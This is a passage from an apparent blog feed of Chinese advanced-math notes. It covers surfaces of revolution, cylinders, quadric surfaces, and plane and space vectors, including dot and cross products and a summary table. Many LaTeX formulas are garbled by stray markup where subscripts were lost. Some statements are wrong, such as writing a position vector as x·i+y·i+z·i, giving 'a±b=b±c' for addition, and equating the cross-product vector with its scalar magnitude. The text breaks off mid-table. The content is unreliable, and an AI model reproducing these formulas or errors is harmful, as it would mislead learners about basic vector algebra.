href="#旋转曲面" class="headerlink" title="旋转曲面"></a>旋转曲面</h4><p>一条平面曲线$C$绕同一平面上的一条定直线$L$旋转一周所形成的曲面称为<strong>旋转曲面</strong>。平面曲线$C$称为旋转曲面的<strong>母线</strong>，定直线$L$称为该旋转曲面的<strong>旋转轴</strong>，简称为<strong>轴</strong>。下面只讨论母线位于某个坐标面上，且绕该坐标面的两条坐标轴旋转所形成的旋转曲面。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/86.gif" alt="3"></p><p>设在$yOz$面上有一已知曲线 $C:f (y, z) = 0$，这条曲线绕$z$轴旋转一周，就得到一个旋转曲面</p><p>在旋转曲面上任取一点$M(x, y, z)$，设这点是由母线$C$上的点$M1(0, y_1, z_1)$绕$z$轴旋转而得到的。由于点$M$与点$M_1$的竖坐标相同，且它们到轴的距离相等，所以有</p><p>$\begin{array}{l}<br>\left{\begin{array}{l}<br>z=z<em>{1} \<br>\sqrt{x^{2}+y^{2}}=\left|y</em>{1}\right|<br>\end{array}\right. \<br>\left{\begin{array}{l}<br>z<em>{1}=z \<br>y</em>{1}= \pm \sqrt{x^{2}+y^{2}}<br>\end{array}\right.<br>\end{array}$</p><p>又因为$M<em>{1}\left(0, y</em>{1}, z<em>{1}\right)$为曲线$\boldsymbol{C}$上任意一点，则有$f\left(y</em>{1}, z_{1}\right)=0$。代入上式得</p><p>$\begin{align}f\left( \pm \sqrt{x^{2}+y^{2}}, z\right)=0\end{align}$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/67.png" alt="image-20230505151900472" style="zoom: 33%;" /></p><p>同理，$x O y$面上的曲线$f(x, y)=0$绕$x$轴或$y$轴旋转一周所得的旋转曲面方程分别为</p><p>$f\left(x, \pm \sqrt{y^{2}+z^{2}}\right)=0$或$f\left( \pm \sqrt{x^{2}+z^{2}}, y\right)=0$</p><p>$x O z$面上的曲线$f(x, z)=0$绕$x$轴或$z$轴旋转一周, 所得的旋转曲面方程分别为</p><p>$f\left(x, \pm \sqrt{y^{2}+z^{2}}\right)=0$或$f\left( \pm \sqrt{x^{2}+y^{2}}, z\right)=0$</p><div class="note success modern"><p>绕哪个轴转，哪个量不变，另外一个量用其余两坐标平方和的平方根表示</p></div><p>例题：已知$yOz$面上一直线的方程为$y = z\tan\alpha$，其中$\alpha$为直线与$z$轴的夹角，求该直线绕$z$轴旋转一周所成旋转曲面的方程。</p><p>只要把直线方程$y =z \tan\alpha$中的$y$换成$\pm \sqrt{x^2+y^2 }$就得到所求旋转曲面方程，即 $\pm \sqrt{x^2+y^2 }=z\tan\alpha$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/68.png" alt="image-20230505172216747" style="zoom:25%;" /></p><h4 id="柱面"><a href="#柱面" class="headerlink" title="柱面"></a>柱面</h4><p>一动直线$L$沿定曲线$C$作平行移动，所形成的曲面称为柱面。定曲线$C$称为柱面的准线，动直线$L$称为柱面的母线</p><p>如果柱面的准线是$xOy$面上的曲线$C:f (x, y) = 0$，母线平行于$z$轴，则该柱面的方程为$f (x, y) = 0$</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/69.png" alt="image-20230505174900389" style="zoom:25%;" /></p><h3 id="二次曲面"><a href="#二次曲面" class="headerlink" title="二次曲面"></a>二次曲面</h3><p>若$F(x,y,z)=0$为$x,y,z$的二次方程，则此方程确定的曲面为二次曲面</p><h4 id="椭球面"><a href="#椭球面" class="headerlink" title="椭球面"></a>椭球面</h4><p>$\frac{x^2}{a^2} +\frac{y^2}{b^2} +\frac{z^2}{c^2}=1$（$a,b,c$为正常数）所确定</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/70.png" alt="image-20230505175734866" style="zoom:25%;" /></p><h4 id="单叶双曲面"><a href="#单叶双曲面" class="headerlink" title="单叶双曲面"></a>单叶双曲面</h4><p>$\frac{x^2}{a^2} +\frac{y^2}{b^2} -\frac{z^2}{c^2}=1$（$a,b,c$为正常数）所确定</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/71.png" alt="image-20230505175827932" style="zoom:25%;" /></p><h4 id="双叶双曲面"><a href="#双叶双曲面" class="headerlink" title="双叶双曲面"></a>双叶双曲面</h4><p>$\frac{x^2}{a^2} -\frac{y^2}{b^2} +\frac{z^2}{c^2}=-1$（$a,b,c$为正常数）所确定</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/72.png" alt="image-20230505175914313" style="zoom:25%;" /></p><h4 id="椭圆抛物面"><a href="#椭圆抛物面" class="headerlink" title="椭圆抛物面"></a>椭圆抛物面</h4><p>$z=\frac{x^2}{2p}+\frac{y^2}{2q}$($p$与$q$同号)</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/73.png" alt="image-20230505180317262" style="zoom:25%;" /></p><h4 id="双曲抛物面"><a href="#双曲抛物面" class="headerlink" title="双曲抛物面"></a>双曲抛物面</h4><p>$z=-\frac{x^2}{2p}+\frac{y^2}{2q}$($p$与$q$同号)</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/74.png" alt="image-20230505180334467" style="zoom:25%;" /></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="高等数学" scheme="https://www.ascotbe.com/categories/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高数" scheme="https://www.ascotbe.com/tags/%E9%AB%98%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>向量</title>
    <link href="https://www.ascotbe.com/2023/03/20/FurtherMathematics_0x09/"/>
    <id>https://www.ascotbe.com/2023/03/20/FurtherMathematics_0x09/</id>
    <published>2023-03-20T15:58:53.000Z</published>
    <updated>2023-04-19T09:38:40.993Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/0_9.gif" alt="0_9" style="zoom: 33%;" /></p><h2 id="共有概念"><a href="#共有概念" class="headerlink" title="共有概念"></a>共有概念</h2><p>概念：空间或者平面具有大小和方向的量</p><p>表示：$\overrightarrow{AB}$或者$\vec{a}$</p><p>膜长：平面或者空间中向量的大小。记作$|\overrightarrow{AB}|$或者$|\vec{a}|$</p><h2 id="特殊向量"><a href="#特殊向量" class="headerlink" title="特殊向量"></a>特殊向量</h2><h3 id="单位向量"><a href="#单位向量" class="headerlink" title="单位向量"></a>单位向量</h3><p>对于任意向量$\vec{a}$，不论方向如何，若其大小为单位长度，则称其为$\vec{a}$方向上的<strong>单位向量</strong>（Unit vector）。单位向量通常被记为$\vec{u}$，它们的模长为1。</p><p>空间坐标系的三个基向量${\displaystyle {\vec {i}}=(1,0,0)}$，${\displaystyle {\vec {j}}=(0,1,0)}$，${\displaystyle {\vec {k}}=(0,0,1)}$都是单位向量。</p><h3 id="反向量"><a href="#反向量" class="headerlink" title="反向量"></a>反向量</h3><p>一个向量$\vec{v}$的<strong>反向量</strong>（Opposite vector）与它大小相等，但方向相反，一般记作${\displaystyle -{\vec {v}}}$。如果向量$\vec{a}$是向量$\vec{b}$的反向量，那么$\vec{b}$也是$\vec{a}$的反向量。</p><p>另外，向量$\vec{a}$的反向量也可按如下定义：</p><blockquote><p>对于给定向量$\vec{a}$，若$\exists$向量$\vec{b}$，使得${\displaystyle {\vec {a}}+{\vec {b}}={\vec {0}}}$成立，则向量$\vec{b}$称为向量$\vec{a}$的<strong>反向量</strong>。</p></blockquote><h3 id="零向量"><a href="#零向量" class="headerlink" title="零向量"></a>零向量</h3><p>始点与终点重合，即大小为0的向量，被称为<strong>零向量</strong>（Zero vector），记以数字0上加箭头。关于零向量有两点值得一提：</p><ol><li>零向量依旧具有<strong>方向性</strong>，但方向不定。因此，零向量与任一向量平行。</li><li>零向量不等于数量$0$，它们是两种性质完全不同的对象，即${\displaystyle {\vec {0}}\neq 0}$。</li></ol><p>零向量可以如下进行形式化定义：</p><blockquote><p>给定一<strong>n</strong>维向量$\vec{z}$，若对于任意的同维向量$\vec{a}$，总有${\displaystyle {\vec {a}}+{\vec {z}}={\vec {a}}}$成立，则向量$\vec{z}$称为<strong>n</strong>维<strong>零向量</strong>，通常被记作$\vec{0}$或$\mathbf{0}$。</p></blockquote><h3 id="等向量"><a href="#等向量" class="headerlink" title="等向量"></a>等向量</h3><p>不论起点终点，两向量长度、方向相等，即为<strong>等向量</strong>或<strong>相等向量</strong>（Identical vector）。</p><p>对于任意向量$\vec{a}$，若其一个相等向量为$\vec{b}$，则对$\vec{b}$和数字-1进行数乘运算后得到的向量${\displaystyle -{\vec {b}}}$即$\vec{a}$的反向量。</p><p>另外，类似于反向量的定义，向量$\vec{a}$等向量也可按如下定义：</p><blockquote><p>对于给定向量$\vec{a}$，若存在向量$\vec{b}$，使得{$\displaystyle {\vec {a}}-{\vec {b}}={\vec {0}}$成立，则向量$\vec{b}$称为向量$\vec{a}$的<strong>相等向量</strong>。</p></blockquote><h3 id="方向向量"><a href="#方向向量" class="headerlink" title="方向向量"></a>方向向量</h3><p><strong>方向向量</strong>（Directional vector）的形式化定义如下：</p><blockquote><p>对于任意向量$\vec{a}$，若存在一个向量$\vec{b}$，两者的方向相同（大小可以不同），则$\vec{b}$是$\vec{a}$的一个<strong>方向向量</strong>。</p></blockquote><p>一般地，所有方向相同的向量之间互为方向向量。</p><h2 id="平面向量"><a href="#平面向量" class="headerlink" title="平面向量"></a>平面向量</h2><h3 id="向量的性质"><a href="#向量的性质" class="headerlink" title="向量的性质"></a>向量的性质</h3><p>除了上面介绍的共有概念外</p><h4 id="有向线段"><a href="#有向线段" class="headerlink" title="有向线段"></a>有向线段</h4><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/53.png" alt="undefined" style="zoom: 15%;" /></p><p>一个以点A为起点，B为终点的有向线段。</p><p>有向线段的概念建构于向量的方向与长度，差别在于多定义了<strong>始点</strong>与<strong>终点</strong>。在文字描述时，如果已知某<strong>有向线段</strong>的<strong>起点</strong>和<strong>终点</strong>分别是<strong>A</strong>和<strong>B</strong>，此线段的长度可以记为$|\overrightarrow{AB}|$</p><h4 id="夹角"><a href="#夹角" class="headerlink" title="夹角"></a>夹角</h4><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/54.png" alt="undefined" style="zoom:50%;" /></p><p>$\overrightarrow{a}$与$\displaystyle {\overrightarrow {b}}$具有夹角$\theta$</p><p><strong>向量的夹角</strong>（Included angle）是对于两个向量而言的概念。对于任意两个给定的向量$\vec{a}$和$\vec{b}$，二者的夹角即将二者图示化后两箭头所夹之角$\theta$，其中$0 \leqslant \theta \leqslant \pi$。</p><p>向量的夹角可由数量积的定义导出计算公式，即：</p><p>$\begin{align}{\displaystyle \cos \theta ={\frac {\vec {a}\cdot {\vec {b}}}{|{\vec {a}}|\cdot|{\vec {b}}|}}}\end{align}$</p><h3 id="线性运算"><a href="#线性运算" class="headerlink" title="线性运算"></a>线性运算</h3><h4 id="加法与减法"><a href="#加法与减法" class="headerlink" title="加法与减法"></a>加法与减法</h4><p>向量的加法满足平行四边形法则和三角形法则。具体地，两个向量$\vec{a}$和$\vec{b}$相加，得到的是另一个向量。这个向量可以表示为$\vec{a}$和$\vec{b}$的起点重合后，以它们为邻边构成的平行四边形的一条对角线（以共同的起点为起点的那一条，见下图左），或者表示为将$\vec{a}$的终点和$\vec{b}$的起点重合后，从$\vec{a}$的起点指向$\vec{b}$的终点的向量：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/55.svg" alt="Vector_addition"></p><p>两个向量$\vec{a}$和$\vec{b}$的相减，则可以看成是向量$\vec{a}$加上一个与$\vec{b}$大小相等，方向相反的向量。又或者，$\vec{a}$和$\vec{b}$的相减得到的向量可以表示为$\vec{a}$和$\vec{b}$的起点重合后，从$\vec{b}$的终点指向$\vec{a}$的终点的向量：</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/56.svg" alt="Vector_subtraction"></p><p>向量的加法也满足交换律和结合律。</p><h4 id="数乘"><a href="#数乘" class="headerlink" title="数乘"></a>数乘</h4><p>$\begin{align}{\displaystyle 1{\vec {a}}={\vec {a}};\quad(-1){\vec {a}}=-{\vec {a}}}&amp;\{\displaystyle (\lambda \mu ){\vec {a}}=\lambda (\mu {\vec {a}})=\mu (\lambda {\vec {a}})}&amp;\{\displaystyle (\lambda +\mu ){\vec {a}}=\lambda {\vec {a}}+\mu {\vec {a}}}&amp;\{\displaystyle \lambda ({\vec {a}}+{\vec {b}})=\lambda {\vec {a}}+\lambda {\vec {b}}}\end{align}$</p><h3 id="向量的坐标表示"><a href="#向量的坐标表示" class="headerlink" title="向量的坐标表示"></a>向量的坐标表示</h3><h4 id="坐标分解"><a href="#坐标分解" class="headerlink" title="坐标分解"></a>坐标分解</h4><p>$\vec{a}=(x_1, y_1),\vec{b}=(x_2,y_2)$</p><h4 id="线性运算的坐标表示"><a href="#线性运算的坐标表示" class="headerlink" title="线性运算的坐标表示"></a>线性运算的坐标表示</h4><p>$\begin{align}&amp;\vec{a}\pm \vec{b}=(\mathrm{x}<em>{1}, \mathrm{y}</em>{1}) \pm(\mathrm{x}<em>{2}, \mathrm{y}</em>{2})  =(\mathrm{x}<em>{1} \pm \mathrm{x}</em>{2}, \mathrm{y}<em>{1} \pm \mathrm{y}</em>{2})\&amp;\lambda(\mathrm{x}, \mathrm{y})  =(\lambda \mathrm{x}, \lambda \mathrm{y})\&amp;|\vec{a}|=|(x, y)|=\sqrt{x^{2}+y^{2}}\&amp;\overrightarrow{\mathrm{a}} \cdot \overrightarrow{\mathrm{b}}=\mathrm{x}<em>{1} \mathrm{x}</em>{2}+\mathrm{y}<em>{1} \mathrm{y}</em>{2}\&amp;\cos \langle\overrightarrow{\mathrm{a}}, \overrightarrow{\mathrm{b}}\rangle=\frac{\overrightarrow{\mathrm{a}} \cdot \overrightarrow{\mathrm{b}}}{|\overrightarrow{\mathrm{a}}||\overrightarrow{\mathrm{b}}|}=\frac{\mathrm{x}<em>{1} \mathrm{x}</em>{2}+\mathrm{y}<em>{1} \mathrm{y}</em>{2}}{\sqrt{\mathrm{x}<em>{1}^{2}+\mathrm{y}</em>{1}^{2}} \cdot \sqrt{\mathrm{x}<em>{2}^{2}+\mathrm{y}</em>{2}^{2}}}\end{align}$</p><h4 id="向量位置关系"><a href="#向量位置关系" class="headerlink" title="向量位置关系"></a>向量位置关系</h4><p>$\begin{align}<br>&amp;\vec{a} = \left(\mathrm{x}<em>{\mathrm{a}}, \mathrm{y}</em>{\mathrm{a}}\right) \<br>&amp;\overrightarrow{\mathrm{b}}  = \left(\mathrm{x}<em>{\mathrm{b}}, \mathrm{y}</em>{\mathrm{b}}\right) \&amp;<br>\overrightarrow{\mathrm{a}} / / \overrightarrow{\mathrm{b}}  \Leftrightarrow \quad \mathrm{x}<em>{\mathrm{a}} \mathrm{y}</em>{\mathrm{b}}  = \mathrm{x}<em>{\mathrm{b}} \mathrm{y}</em>{\mathrm{a}} \&amp;<br>\overrightarrow{\mathrm{a}} \perp \overrightarrow{\mathrm{b}}  \Leftrightarrow \mathrm{x}<em>{\mathrm{a}} \mathrm{x}</em>{\mathrm{b}}+\mathrm{y}<em>{\mathrm{b}} \mathrm{y}</em>{\mathrm{a}}  = 0<br>\end{align}$</p><h2 id="空间向量"><a href="#空间向量" class="headerlink" title="空间向量"></a>空间向量</h2><h3 id="空间直角坐标系"><a href="#空间直角坐标系" class="headerlink" title="空间直角坐标系"></a>空间直角坐标系</h3><p>一点：坐标原点$o$</p><p>三轴：$x$、$y$、$z$轴（横轴、纵轴、竖轴）</p><p>三个坐标平面：$xoy$、$yoz$、$zox$面</p><p>八卦限：I、II、III、IV、V、VI、VII、VIII</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/57.svg" alt="Octant_numbers" style="zoom: 25%;" /></p><p>空间中的点$M<em>1(x</em>{1},y<em>{1},z</em>{1})$和$M<em>2(x</em>{2},y<em>{2},z</em>{2})$之间的距离是距离为</p><p>$\begin{align}{\displaystyle d={\sqrt {(x<em>{2}-x</em>{1})^{2}+(y<em>{2}-y</em>{1})^{2}+(z<em>{2}-z</em>{1})^{2}}}}\end{align}$</p><h3 id="线性运算-1"><a href="#线性运算-1" class="headerlink" title="线性运算"></a>线性运算</h3><h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>在平面的基础上面新增</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/58.png" alt="image-20230326215049142"></p><h4 id="数乘（与平面向量一致）"><a href="#数乘（与平面向量一致）" class="headerlink" title="数乘（与平面向量一致）"></a>数乘（与平面向量一致）</h4><p>$\begin{align}{\displaystyle 1{\vec {a}}={\vec {a}};\quad(-1){\vec {a}}=-{\vec {a}}}\{\displaystyle (\lambda \mu ){\vec {a}}=\lambda (\mu {\vec {a}})=\mu (\lambda {\vec {a}})}\{\displaystyle (\lambda +\mu ){\vec {a}}=\lambda {\vec {a}}+\mu {\vec {a}}}\{\displaystyle \lambda ({\vec {a}}+{\vec {b}})=\lambda {\vec {a}}+\lambda {\vec {b}}}\end{align}$</p><h3 id="向量的坐标表示-1"><a href="#向量的坐标表示-1" class="headerlink" title="向量的坐标表示"></a>向量的坐标表示</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/59.png" alt="image-20230323002108695"></p><p>$\vec{r}$：起点$O$，终点$M(x,y,z)$</p><p>推导向量的坐标表示（试子中的$\vec{i}$是单位向量，也就是1）：</p><p>$\begin{align}<br>\vec{r} &amp; = \overrightarrow{OM} = \overrightarrow{ON}+\overrightarrow{NM}\ &amp; = \overrightarrow{OP}+\overrightarrow{OQ}+\overrightarrow{OR}\&amp;=x\vec{i}+y\vec{i}+z\vec{i}\&amp;=(x,y,z)<br>\end{align}$</p><p>例如：$M_1(1,1,2),M_2(2,3,4)$，则$\overrightarrow{M_1M_2}=M_2-M_1=(2-1,3-1,4-2)=(1,2,2)$</p><p>设$\vec{a}=(x_1,y_1,z_1),\vec{b}=(x_2,y_2,z_2)$，则：</p><p>$\begin{align} &amp;\vec{a}\pm \vec{b}=(x_1\pm x_2,y_1\pm y_2,z_1\pm z_2) \ &amp;\lambda \vec{a}=(\lambda x_1,\lambda y_1,\lambda z_1)\end{align}$</p><p>那么膜就是$|\vec{a}|=\sqrt{x_1^2+y_1^2+z_1^2}$</p><p>向量平行的充要条件：设向量$\vec{a}$非零，这向量$\vec{b}$平行于向量$\vec{a}$的充要条件是：$\frac{x<em>{2}}{x</em>{1}}=\frac{y<em>{2}}{y</em>{1}}=\frac{z<em>{2}}{z</em>{1}}$</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>已知点$A(4,0,5), B(7,1,3)$，求$(1)\quad \overrightarrow{A B} \quad; (2)\quad |\overrightarrow{A B}|\quad;  (3)\quad  \vec{e_{\overrightarrow{A B}}}\quad;(4)\quad$若$\vec{b}=(6,\lambda,\mu )$，且$\vec{b}\mathop{//}\overrightarrow{AB}$，求常数$\lambda,\mu$<br>(1) $\overrightarrow{A B}=(3,1,-2)$</p><p>(2) $|\overrightarrow{A B}|=\sqrt{3^{2}+1^{2}+(-2)^{2}}=\sqrt{14}$ </p><p>(3) 由于有公式为：$\vec{e_{\overrightarrow{A B}}}=\frac{\overrightarrow{AB} }{|\overrightarrow{AB}|}$，所以该题解法如下</p><p>${\vec e_{\overrightarrow{A B}}}=\frac{1}{\sqrt{14 }} \cdot(3,1,-2)$</p><p>(4) 根据上面的平行充要条件得出$\frac{6}{3}=\frac{\lambda}{1}=\frac{\mu}{-2}$，所以解得$\lambda=2,\mu=-4$</p><h3 id="方向角和方向余弦"><a href="#方向角和方向余弦" class="headerlink" title="方向角和方向余弦"></a>方向角和方向余弦</h3><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/60.png" alt="image-20230322235245463"></p><p>定义：向量$\overrightarrow{O M}=(x, y, z)$与$x$轴、$y$轴、$z$轴正向的夹角$\alpha$ 、$\beta$ 、$\gamma$(其中$0 \leqslant \alpha \leqslant \pi, 0 \leqslant   \beta \leqslant \pi, 0 \leqslant \gamma \leqslant \pi$)  叫向量  $\overrightarrow{O M}$的方向角</p><p>方向角$\alpha, \beta, \gamma$的余弦$\cos \alpha, \cos \beta, \cos \gamma$叫向量$\overrightarrow{O M}$的方向余弦，由上图可知</p><p>$\begin{align} \cos \alpha=\frac{x}{\sqrt{x^{2}+y^{2}+z^{2}}}\ \cos \beta=\frac{y}{\sqrt{x^{2}+y^{2}+z^{2}}} \<br>\cos \gamma=\frac{z}{\sqrt{x^{2}+y^{2}+z^{2}}}<br>\end{align}$</p><p>方向余弦具有如下性质:<br>(1) $\cos ^{2} \alpha+\cos ^{2} \beta+\cos ^{2} \gamma=1$<br>(2)  $\boldsymbol{e}=(\cos \alpha, \cos \beta, \cos \gamma)$是一个与$\overrightarrow{O M}$同向的单位向量.</p><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><p>已知点$M<em>{1}(2,2, \sqrt{2})$和$M</em>{2}(1,3,0)$, 求向量$\overrightarrow{M<em>{1} M</em>{2}}$的模、方向余弦及方向角. </p><p>解$\overrightarrow{M_1M_2}=(1-2,3-2,0-\sqrt{2})=(-1,1,-\sqrt{2})$</p><p>$\begin{align}<br>\left|\overrightarrow{M<em>{1} M</em>{2}}\right|=\sqrt{(-1)^{2}+1^{2}+(-\sqrt{2})^{2}}=2 \<br>\cos \alpha=-\frac{1}{2}, \cos \beta=\frac{1}{2}, \cos \gamma=-\frac{\sqrt{2}}{2} \<br>\alpha=\frac{2 \pi}{3}, \beta=\frac{\pi}{3}, \gamma=\frac{3 \pi}{4}<br>\end{align}$</p><h2 id="向量积"><a href="#向量积" class="headerlink" title="向量积"></a>向量积</h2><div class="note success modern"><p>点乘，也叫数量积。结果是一个向量在另一个向量方向上投影的长度，是一个标量。一般点乘用来判断两个向量是否垂直，因为比较好算。也可以用来计算一个向量在某个方向上的投影长度。</p><p>叉乘，也叫向量积。结果是一个和已有两个向量都垂直的向量。叉乘更多的是判断某个平面的方向。</p></div><p>在数学和向量代数领域，叉积（英语：Cross product）又称向量积（英语：Vector product），是对三维空间中的两个向量的二元运算，使用符号$\times$。与点积不同，它的运算结果是向量。对于线性无关的两个向量$a$和$b$，它们的叉积写作$a\times b$，是$a$和$b$所在平面的法线向量，与$a$和$b$都垂直。</p><p>向量积是一个向量, 通常表示为$\mathbf{a} \times \boldsymbol{b}$ </p><ol><li>它的模(即长度)为$|\mathbf{a} \times \mathbf{b}|=|\mathbf{a}||\mathbf{b}| \sin \theta\qquad$($\theta$为向量$\mathbf{a}$和$\mathbf{b}$的夹角)</li><li>方向垂直于向量$\mathbf{a}$和$\mathbf{b}$, 且$(\boldsymbol{a}, \boldsymbol{b}, \mathbf{a} \times \boldsymbol{b})$构成右手系。</li></ol><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FurtherMathematics/61.png" alt="右手定则"></p><h3 id="代数性质"><a href="#代数性质" class="headerlink" title="代数性质"></a>代数性质</h3><p>对于任意三个向量$\mathbf {a}$、$\mathbf {b}$、$\mathbf {c}$</p><ul><li>${\displaystyle \mathbf {a} \times \mathbf {a} =\mathbf {0} }$</li><li>${\displaystyle \mathbf {a} \times \mathbf {0} =\mathbf {0} }$</li><li>${\displaystyle \mathbf {a} \times \mathbf {b} =-\mathbf {b} \times \mathbf {a} }$</li><li>${\displaystyle \mathbf {a} \times (\mathbf {b} +\mathbf {c} )=\mathbf {a} \times \mathbf {b} +\mathbf {a} \times \mathbf {c} }$</li><li>${\displaystyle (\mathbf {a} +\mathbf {b} )\times \mathbf {c} =\mathbf {a} \times \mathbf {c} +\mathbf {b} \times \mathbf {c} }$</li><li>${\displaystyle (\lambda \mathbf {a} )\times \mathbf {b} =\lambda (\mathbf {a} \times \mathbf {b} )=\mathbf {a} \times (\lambda \mathbf {b} )}$</li><li>${\displaystyle \mathbf {a} \times \mathbf {b} +\mathbf {c} \times \mathbf {d} =(\mathbf {a} -\mathbf {c} )\times (\mathbf {b} -\mathbf {d} )+\mathbf {a} \times \mathbf {d} +\mathbf {c} \times \mathbf {b} }$</li><li>${\displaystyle |\mathbf {a} \times \mathbf {b} |=|\mathbf {b} \times \mathbf {a} |}$</li><li>${\displaystyle |\mathbf {a} \times \mathbf {b} |^{2}=|\mathbf {a} |^{2}|\mathbf {b} |^{2}-(\mathbf {a} \cdot \mathbf {b} )^{2}={\begin{vmatrix}\mathbf {a} \cdot \mathbf {a} &amp;\mathbf {a} \cdot \mathbf {b} \\mathbf {a} \cdot \mathbf {b} &amp;\mathbf {b} \cdot \mathbf {b} \\end{vmatrix}}}$</li></ul><h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p>外积可以表达为这样的行列式：</p><p>${\displaystyle \mathbf {a\times b} ={\begin{vmatrix}\mathbf {i} &amp;\mathbf {j} &amp;\mathbf {k} \x<em>{1}&amp;y</em>{1}&amp;z<em>{1}\x</em>{2}&amp;y<em>{2}&amp;z</em>{2}\\end{vmatrix}}}$</p><p>使用拉普拉斯展开可以沿第一行展开为</p><p>${\displaystyle {\begin{aligned}\mathbf {a\times b} &amp;={\begin{vmatrix}y<em>{1}&amp;z</em>{1}\y<em>{2}&amp;z</em>{2}\end{vmatrix}}\mathbf {i} -{\begin{vmatrix}x<em>{1}&amp;z</em>{1}\x<em>{2}&amp;z</em>{2}\end{vmatrix}}\mathbf {j} +{\begin{vmatrix}x<em>{1}&amp;y</em>{1}\x<em>{2}&amp;y</em>{2}\end{vmatrix}}\mathbf {k} \&amp;=(y<em>{1}z</em>{2}-z<em>{1}y</em>{2})\mathbf {i} -(x<em>{1}z</em>{2}-z<em>{1}x</em>{2})\mathbf {j} +(x<em>{1}y</em>{2}-y<em>{1}x</em>{2})\mathbf {k} \&amp;=(y<em>{1}z</em>{2}-z<em>{1}y</em>{2})\mathbf {i} +(z<em>{1}x</em>{2}-x<em>{1}z</em>{2})\mathbf {j} +(x<em>{1}y</em>{2}-y<em>{1}x</em>{2})\mathbf {k}\end{aligned}}}$</p><p>都可以直接得到结果向量。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>平面向量：若$\vec{a}=(x_1,y_1),\vec{b}=(x_2.y_2)$</p><p>空间向量：若$\vec{a}=(x_1,y_1,z_1),\vec{b}=(x_2.y_2,z_2)$</p><div class="table-container"><table><thead><tr><th></th><th>向量表示</th><th>坐标表示（平面）</th><th>坐标表示（空间）</th></tr></thead><tbody><tr><td>数量积</td><td>$\vec{a} \cdot \vec{b}=\mid \vec{a}\mid \mid \vec{b}\mid \cos \theta$</td><td>$\vec{a} \cdot \vec{b}=x<em>{1} x</em>{2}+y<em>{1} y</em>{2}$</td><td>$\vec{a} \cdot \vec{b}=x<em>{1} x</em>{2}+y<em>{1} y</em>{2}+z<em>{1} z</em>{2}$</td></tr><tr><td>向量积</td><td>$\vec{a} \times \vec{b}=\mid \vec{a}\mid \mid \vec{b}\mid \sin \theta$</td><td>无</td><td>$\vec{a} \times \vec{b}=(y_1z_2-z_1y_2,z_1x_2-x_1z_2,x_1y_2-y_1x_2)$</td></tr><tr><td>长度（膜）</td><td>$\mid \vec{a}\mid =\sqrt{\vec{a}^2}$</td><td>$\mid \vec{a}\mid =\sqrt{x<em>{1}^{2}+y</em>{1}^{2}}$</td><td>$\mid \vec{a}\mid =\sqrt{x<em>{1}^{2}+y</em>{1}^{2}+z_{1}^{2}}$</td></tr><tr><td>夹角</td><td>$\cos \theta=\frac{\vec{a} \cdot \vec{b}}{\mid \vec{a}\mid \mid \vec{b}\mid }$</td><td>$\cos \theta=\frac{x<em>{1} x</em>{2}+y<em>{1} y</em>{2}}{\sqrt{x<em>{1}^{2}+y</em>{1}^{2}} \cdot \sqrt{x<em>{2}^{2}+y</em>{2}^{2}}}$</td><td>$\cos \theta=\frac{x<em>{1} x</em>{2}+y<em>{1} y</em>{2}+z<em>{1} z</em>{2}}{\sqrt{x<em>{1}^{2}+y</em>{1}^{2}+z<em>{1}^{2}} \cdot \sqrt{x</em>{2}^{2}+y<em>{2}^{2}+z</em>{2}^{2}}}$</td></tr><tr><td>平行</td><td>$\vec{a}=\lambda \vec{b}(\vec{b} \neq \overrightarrow{0})$</td><td>$\frac{x<em>{1}}{x</em>{2}}=\frac{y<em>{1}}{y</em>{2}}(x<em>{2} y</em>{2} \neq 0)$</td><td>$\frac{x<em>{1}}{x</em>{2}}=\frac{y<em>{1}}{y</em>{2}}=\frac{z<em>{1}}{z</em>{2}}(x<em>{2} y</em>{2} z_{2}\neq 0)$</td></tr><tr><td>垂直</td><td>$\vec{a} \cdot \vec{b}=0$</td><td>$x<em>{1} x</em>{2}+y<em>{1} y</em>{2}=0$</td><td>$x<em>{1} x</em>{2}+y<em>{1} y</em>{2}+z<em>{1} z</em>{2}=0$</td></tr><tr><td>加减法</td><td>$\vec{a}\pm \vec{b}=\vec{b}\pm \vec{c}$</td><td>$\vec{a}\pm \vec{b}=(\mathrm{x}<em>{1}, \mathrm{y}</em>{1}) \pm(\mathrm{x}<em>{2}, \mathrm{y}</em>{2})  =(\mathrm{x}<em>{1} \pm \mathrm{x}</em>{2}, \mathrm{y}<em>{1} \pm \mathrm{y}</em>{2})$</td><td>$\vec{a}\pm \vec{b}=(\mathrm{x}<em>{1}, \mathrm{y}</em>{1},\mathrm{z}<em>{1}) 